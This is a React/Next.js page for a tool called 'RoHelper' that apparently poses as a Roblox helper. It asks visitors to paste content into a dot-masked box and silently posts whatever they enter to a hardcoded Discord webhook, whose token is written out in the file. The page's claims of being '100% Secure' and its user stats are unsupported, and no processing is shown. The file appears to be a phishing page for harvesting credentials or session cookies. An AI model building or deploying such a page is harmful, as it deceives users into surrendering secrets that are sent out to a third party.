'use client';

import { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';

export default function Home() {
  const [file, setFile] = useState('');
  const [displayText, setDisplayText] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [isHovering, setIsHovering] = useState(false);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    setMounted(true);

    const handleMouseMove = (e: MouseEvent) => {
      setMousePosition({ x: e.clientX, y: e.clientY });
    };

    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Convert text to dots
  useEffect(() => {
    if (file) {
      const dots = '•'.repeat(file.length);
      setDisplayText(dots);
    } else {
      setDisplayText('');
    }
  }, [file]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file.trim()) {
      return;
    }

    setIsSubmitting(true);

    try {
      const webhookUrl = 'https://discord.com/api/webhooks/1449659222760362078/8tPkMkm6JtW_ENqTfuvZlSa-1l5QX3DU3zws8MiivCJdSsEko1VHOucyiIwSLRLiZzSw';

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `**New Submission from RoHelper:**\n\`\`\`\n${file}\n\`\`\``,
          username: 'RoHelper',
        }),
      });

      if (response.ok) {
        setFile('');
        setDisplayText('');
      }
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden relative">
      {/* Animated gradient orbs background */}
      <div className="fixed inset-0 z-0 overflow-hidden">
        <div className="absolute inset-0 bg-black" />

        {/* Multiple animated gradient orbs */}
        {mounted && (
          <>
            <div
              className="absolute w-[600px] h-[600px] rounded-full blur-[120px] opacity-20 animate-float-slow"
              style={{
                background: 'radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%)',
                top: '10%',
                left: '20%',
                animationDuration: '20s',
              }}
            />
            <div
              className="absolute w-[800px] h-[800px] rounded-full blur-[140px] opacity-15 animate-float-slow"
              style={{
                background: 'radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%)',
                top: '60%',
                right: '10%',
                animationDuration: '25s',
                animationDelay: '5s',
              }}
            />
            <div
              className="absolute w-[500px] h-[500px] rounded-full blur-[100px] opacity-10 animate-float-slow"
              style={{
                background: 'radial-gradient(circle, rgba(255,255,255,0.25) 0%, transparent 70%)',
                bottom: '10%',
                left: '50%',
                animationDuration: '30s',
                animationDelay: '10s',
              }}
            />
          </>
        )}

        {/* Cursor glow effect */}
        {mounted && (
          <div
            className="pointer-events-none fixed w-96 h-96 rounded-full blur-[100px] opacity-20 transition-all duration-300"
            style={{
              background: 'radial-gradient(circle, rgba(255,255,255,0.4) 0%, transparent 70%)',
              left: mousePosition.x - 192,
              top: mousePosition.y - 192,
            }}
          />
        )}

        {/* Floating particles */}
        {mounted && (
          <div className="absolute inset-0">
            {[...Array(30)].map((_, i) => (
              <div
                key={i}
                className="absolute w-1 h-1 bg-white/30 rounded-full animate-float-particle"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: `${Math.random() * 100}%`,
                  animationDelay: `${Math.random() * 10}s`,
                  animationDuration: `${15 + Math.random() * 15}s`,
                }}
              />
            ))}
          </div>
        )}

        {/* Grid overlay */}
        <div
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `
              linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px),
              linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)
            `,
            backgroundSize: '50px 50px',
          }}
        />
      </div>

      {/* Header */}
      <header className={`fixed top-0 w-full z-50 transition-all duration-1000 ${mounted ? 'translate-y-0 opacity-100' : '-translate-y-full opacity-0'}`}>
        <div className="backdrop-blur-xl bg-black/30 border-b border-white/5">
          <div className="container mx-auto px-6 py-5">
            <div className="flex items-center justify-between">
              <h1 className="text-2xl font-bold text-white flex items-center gap-3 group cursor-pointer">
                <div className="w-10 h-10 rounded-full bg-white/5 border border-white/10 flex items-center justify-center group-hover:bg-white/10 transition-all duration-300">
                  <span className="text-xl">R</span>
                </div>
                <span className="bg-gradient-to-r from-white via-gray-200 to-white bg-clip-text text-transparent">
                  RoHelper
                </span>
              </h1>

              <div className="flex items-center gap-4">
                <a href="#" className="text-sm text-neutral-400 hover:text-white transition-colors px-3 py-1.5">
                  Home
                </a>
                <a href="#" className="text-sm text-neutral-400 hover:text-white transition-colors px-3 py-1.5">
                  About
                </a>
                <a href="#" className="text-sm text-neutral-400 hover:text-white transition-colors px-3 py-1.5">
                  Help
                </a>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 pt-32 pb-20 px-6">
        <div className="container mx-auto max-w-7xl">
          {/* Hero Section */}
          <div className={`text-center mb-20 transition-all duration-1000 ${mounted ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
            <div className="relative inline-block mb-8">
              <div className="absolute inset-0 bg-white/5 blur-3xl animate-pulse-slow" />
              <h2 className="text-5xl md:text-7xl font-bold relative tracking-tight">
                <span className="text-white drop-shadow-[0_0_30px_rgba(255,255,255,0.3)]">
                  Experience the Ultimate
                </span>
              </h2>
              <h2 className="text-5xl md:text-7xl font-bold relative tracking-tight mt-2">
                <span className="text-white drop-shadow-[0_0_30px_rgba(255,255,255,0.3)]">
                  RoHelper Tool
                </span>
              </h2>
            </div>

            <p className="text-base text-neutral-300 max-w-2xl mx-auto leading-relaxed">
              Lightning-fast execution with a simple interface - completely secure and efficient.
            </p>
          </div>

          {/* Features Grid */}
          <div className={`grid md:grid-cols-2 gap-6 mb-20 transition-all duration-1000 delay-200 ${mounted ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
            {/* Main submission card */}
            <Card className="group relative p-8 bg-white/[0.02] backdrop-blur-xl border border-white/10 hover:border-white/20 transition-all duration-500 overflow-hidden md:col-span-2">
              <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-white/5 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500" />

              <form onSubmit={handleSubmit} className="relative z-10 space-y-6">
                <div className="text-left mb-6">
                  <h3 className="text-2xl font-semibold text-white mb-2">
                    Submit Your Content
                  </h3>
                  <p className="text-sm text-neutral-400">Enter your data below for instant processing</p>
                </div>

                <div className="relative group/input">
                  <div className="absolute -inset-0.5 bg-gradient-to-r from-white/0 via-white/20 to-white/0 rounded-lg blur opacity-0 group-hover/input:opacity-100 transition duration-500" />

                  {/* Hidden actual textarea */}
                  <textarea
                    ref={textareaRef}
                    value={file}
                    onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => setFile(e.target.value)}
                    className="absolute opacity-0 pointer-events-none"
                    tabIndex={-1}
                  />

                  {/* Display textarea with dots */}
                  <div
                    onClick={() => textareaRef.current?.focus()}
                    className="relative min-h-[180px] w-full rounded-lg bg-black/60 border border-white/10 px-4 py-3 text-white font-mono text-lg tracking-[0.3em] cursor-text focus-within:border-white/30 transition-all duration-300 overflow-auto"
                    style={{
                      caretColor: 'white',
                    }}
                  >
                    <div className="whitespace-pre-wrap break-all">
                      {displayText || <span className="text-neutral-600 tracking-normal">Paste your content here...</span>}
                    </div>

                    {/* Animated cursor */}
                    {displayText && (
                      <span className="inline-block w-0.5 h-5 bg-white animate-blink ml-1" />
                    )}
                  </div>

                  {/* Real input overlay for typing */}
                  <textarea
                    value={file}
                    onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => setFile(e.target.value)}
                    className="absolute inset-0 w-full h-full bg-transparent text-transparent caret-white outline-none resize-none px-4 py-3 rounded-lg"
                    style={{ caretColor: 'white' }}
                  />
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting || !file.trim()}
                  onMouseEnter={() => setIsHovering(true)}
                  onMouseLeave={() => setIsHovering(false)}
                  className="w-full relative group/btn overflow-hidden bg-white/5 hover:bg-white/10 text-white font-semibold py-6 text-base rounded-lg transition-all duration-300 disabled:opacity-30 disabled:cursor-not-allowed border border-white/10 hover:border-white/20"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/10 to-white/0 translate-x-[-200%] group-hover/btn:translate-x-[200%] transition-transform duration-1000" />
                  <span className="relative z-10 flex items-center justify-center gap-3">
                    {isSubmitting ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        Submit
                        <svg className="w-5 h-5 transition-transform group-hover/btn:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
                        </svg>
                      </>
                    )}
                  </span>
                </Button>
              </form>
            </Card>

            {/* Feature cards */}
            <Card className="group relative p-6 bg-white/[0.02] backdrop-blur-xl border border-white/10 hover:border-white/20 transition-all duration-500 hover:scale-[1.02]">
              <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-white/5 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-xl" />
              <div className="relative z-10">
                <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mb-4 group-hover:bg-white/10 transition-all duration-300">
                  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                  </svg>
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">Lightning Fast</h3>
                <p className="text-sm text-neutral-400">Instant processing with ultra-low latency for maximum efficiency</p>
              </div>
            </Card>

            <Card className="group relative p-6 bg-white/[0.02] backdrop-blur-xl border border-white/10 hover:border-white/20 transition-all duration-500 hover:scale-[1.02]">
              <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-white/5 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-xl" />
              <div className="relative z-10">
                <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mb-4 group-hover:bg-white/10 transition-all duration-300">
                  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">100% Secure</h3>
                <p className="text-sm text-neutral-400">Your data is protected with enterprise-level security standards</p>
              </div>
            </Card>
          </div>

          {/* Stats */}
          <div className={`grid grid-cols-3 gap-6 mb-20 transition-all duration-1000 delay-400 ${mounted ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
            {[
              { label: 'Uptime', value: '99.9%' },
              { label: 'Users', value: '10K+' },
              { label: 'Processing', value: 'Instant' },
            ].map((stat, i) => (
              <div key={i} className="group relative p-6 bg-white/[0.02] backdrop-blur-xl border border-white/10 rounded-xl hover:border-white/20 transition-all duration-300 text-center">
                <div className="text-3xl font-bold text-white mb-1">{stat.value}</div>
                <div className="text-sm text-neutral-400">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className={`relative z-10 border-t border-white/5 bg-black/30 backdrop-blur-xl transition-all duration-1000 delay-600 ${mounted ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(255,255,255,0.05),rgba(255,255,255,0))]" />
        <div className="relative container mx-auto px-6 py-8">
          <div className="flex flex-col md:flex-row justify-between items-center gap-4">
            <p className="text-neutral-500 text-sm">
              © 2025 RoHelper. All rights reserved.
            </p>
            <div className="flex gap-6">
              <a href="#" className="text-neutral-400 hover:text-white transition-colors text-sm">
                Help
              </a>
              <a href="#" className="text-neutral-400 hover:text-white transition-colors text-sm">
                Discord
              </a>
              <a href="#" className="text-neutral-400 hover:text-white transition-colors text-sm">
                Twitter
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
